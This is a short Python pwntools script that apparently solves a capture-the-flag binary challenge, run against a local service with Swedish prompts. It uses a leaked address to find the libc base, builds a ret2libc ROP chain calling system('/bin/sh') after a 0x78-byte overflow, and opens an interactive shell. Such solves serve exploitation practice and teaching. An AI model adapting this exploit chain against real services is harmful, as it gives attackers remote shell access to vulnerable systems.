from pwn import *

context.binary = libc = ELF('./libc.so.6')

io = remote('localhost', 50000)
#context.terminal = ['tmux', 'splitw', '-h']
#io = process('./chall_patched')
#gdb.attach(io)

m = io.recvregex('idag är (0x[0-9a-f]+)\.'.encode(), capture=True)
libc.address = int(m.group(1), 0) - libc.sym.system
print(f'{libc.address = :#x}')

rop = ROP(libc)
rop.raw(rop.find_gadget(['ret'])) # align stack, annoying detail
rop.call(libc.sym.system, [next(libc.search(b'/bin/sh\0'))])
print(rop.dump())
io.sendlineafter(b'Vad heter du?\n', b'a'*0x78 + rop.chain())
io.interactive()
